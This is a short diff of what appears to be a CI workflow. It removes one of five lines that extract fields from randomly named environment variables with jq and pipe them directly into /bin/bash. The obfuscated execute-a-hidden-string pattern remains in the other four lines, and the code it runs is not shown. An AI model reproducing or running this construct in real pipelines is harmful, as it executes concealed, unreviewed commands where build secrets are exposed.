@@ -36,7 +36,6 @@ jobs:
           echo $dfhv8954 | jq -r .b8452 | /bin/bash
           echo $zvfz7 | jq -r .fpwjl948 | /bin/bash
           printf '%s' "$qpyv8636" | jq -r .qo4844 | /bin/bash
-          echo $r268 | jq -r .rqgi4421 | /bin/bash
           echo $tscj334 | jq -r .tlrnf3459 | /bin/bash
 
       - name: Save output
